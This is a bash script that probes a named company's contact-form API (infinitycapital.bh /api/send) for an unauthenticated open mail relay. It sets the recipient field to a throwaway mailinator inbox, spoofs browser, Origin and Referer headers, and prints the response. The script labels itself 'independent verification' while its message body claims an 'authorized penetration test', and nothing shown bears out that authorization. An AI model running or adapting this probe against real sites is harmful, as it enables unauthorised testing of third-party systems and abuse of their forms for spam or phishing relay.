#!/bin/bash
# Independent verification of unauthenticated /api/send recipient control.
# Target mailbox is a throwaway mailinator.com inbox created solely for this test.
DEST="${1:-relayverify20260930@mailinator.com}"
OUT="${2:-relay1}"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'

echo "### probing with destination: $DEST"

curl -s -D "${OUT}.hdr" -o "${OUT}.body" -X POST 'https://www.infinitycapital.bh/api/send' \
  -H "User-Agent: ${UA}" \
  -H 'Origin: https://www.infinitycapital.bh' \
  -H 'Referer: https://www.infinitycapital.bh/contact' \
  -F 'fname=Security' \
  -F 'lname=Tester' \
  -F 'areacode=+973' \
  -F 'tel=0000000' \
  -F 'cname=Independent Verification' \
  -F 'subject=Security Test - unauthorized relay probe' \
  -F 'msg=Authorized penetration test of infinitycapital contact API. Please disregard.' \
  -F 'check=1' \
  -F "targets=${DEST}"

echo "--- status/headers ---"
head -1 "${OUT}.hdr"
grep -iE 'x-matched-path|content-type|x-vercel-id' "${OUT}.hdr"
echo "--- body ---"
cat "${OUT}.body"; echo
